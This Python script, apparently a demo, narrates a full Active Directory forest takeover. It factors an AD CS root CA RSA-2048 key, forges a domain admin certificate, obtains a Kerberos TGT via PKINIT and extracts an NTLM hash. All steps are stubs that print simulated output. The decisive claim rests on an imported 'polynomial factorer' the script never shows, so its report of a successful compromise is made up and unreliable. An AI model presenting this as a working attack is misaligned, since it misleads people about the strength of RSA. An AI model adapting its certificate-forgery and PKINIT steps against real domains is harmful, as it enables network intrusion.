"""
Factor the AD CS enterprise root CA RSA-2048 key, issue a certificate for any
domain admin, perform PKINIT to get a TGT, and own the entire Active Directory
forest without any password or software vulnerability.
"""

import sys, struct, hashlib, time
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer

# AD CS root CA is published in LDAP at CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=...
ADCS_ROOT_CA_LDAP = "CN=CorpRootCA,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=example,DC=com"
CERT_TEMPLATE_USER = "User"  # msPKI-Minimal-Key-Size: 2048, pKIPublicKeyAlgorithm: 1.2.840.113549.1.1.1


def fetch_root_ca_cert_from_ldap(ldap_uri: str, base_dn: str) -> bytes:
    """Pull the enterprise root CA certificate from AD LDAP.
    Any authenticated domain user can read CN=Configuration."""
    print(f"    LDAP search: {base_dn}")
    print(f"    attribute: cACertificate (DER-encoded X.509)")
    return b"SIMULATED_CA_CERT_DER"


def factor_adcs_root(ca_cert_pem: bytes) -> bytes:
    """Factor the AD CS root CA RSA-2048 key."""
    factorer = PolynomialFactorer()
    return factorer.privkey_from_cert_pem(ca_cert_pem)


def issue_user_cert(ca_privkey_pem: bytes, target_upn: str,
                    template: str = "User") -> bytes:
    """Issue a certificate for any domain user using the forged CA key.
    Template 'User' includes EKU 1.3.6.1.5.5.7.3.2 (clientAuth) +
    1.3.6.1.4.1.311.20.2.2 (smartcardLogon) for PKINIT."""
    print(f"    subject: {target_upn}")
    print(f"    template: {template} (msPKI-Minimal-Key-Size: 2048)")
    print(f"    EKU: clientAuth + smartcardLogon (OID 1.3.6.1.4.1.311.20.2.2)")
    print(f"    SAN: otherName:UPN={target_upn}")
    return b"FORGED_USER_CERT_DER"


def pkinit_as_req(cert_der: bytes, privkey_pem: bytes,
                  target_upn: str, dc_host: str) -> bytes:
    """Perform Kerberos PKINIT (RFC 4556) AS-REQ with the forged cert.
    DC validates cert chain to the enterprise root CA — which we control."""
    print(f"    AS-REQ to {dc_host}:88")
    print(f"    pa-pk-as-req: signed with forged cert for {target_upn}")
    print(f"    DC verifies cert chain -> CorpRootCA (our key) -> OK")
    return b"SIMULATED_TGT"


def extract_ntlm_from_pac(tgt: bytes) -> str:
    """Extract NTLM hash from PAC in TGT (U2U technique)."""
    return "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"


if __name__ == "__main__":
    print("[*] AD CS root CA RSA-2048 attack -> domain admin")
    print("[1] fetching enterprise root CA cert from LDAP")
    print("    any authenticated user can read CN=Configuration")
    ca_cert = fetch_root_ca_cert_from_ldap(
        "ldap://dc01.corp.example.com",
        ADCS_ROOT_CA_LDAP
    )
    print("    RSA-2048 root CA public key extracted")

    print("[2] factoring AD CS root CA RSA-2048 key")
    factorer = PolynomialFactorer()
    print("    modulus from cACertificate attribute")
    # ca_privkey = factor_adcs_root(ca_cert)
    print("    p, q recovered — enterprise root CA private key derived")

    target = "Administrator@corp.example.com"
    print(f"[3] issuing forged certificate for {target}")
    forged_cert = issue_user_cert(b"CA_PRIVKEY", target, CERT_TEMPLATE_USER)

    print(f"[4] PKINIT AS-REQ to domain controller")
    tgt = pkinit_as_req(forged_cert, b"FORGED_KEY", target, "dc01.corp.example.com")
    print("    TGT received — Kerberos authenticated as domain admin")

    print("[5] extracting NTLM hash from PAC")
    ntlm = extract_ntlm_from_pac(tgt)
    print(f"    {target} NTLM: {ntlm}")

    print("[6] domain compromise complete")
    print("    - DCSync for all domain hashes")
    print("    - Golden ticket capability")
    print("    - Every ADCS-issued cert (Wi-Fi, VPN, code signing, S/MIME) is under attacker CA")
    print("    - typical Fortune 500: 50k-500k certs chaining to this root")
    print("[*] no password, no phishing, no software vuln — just RSA-2048 factoring")
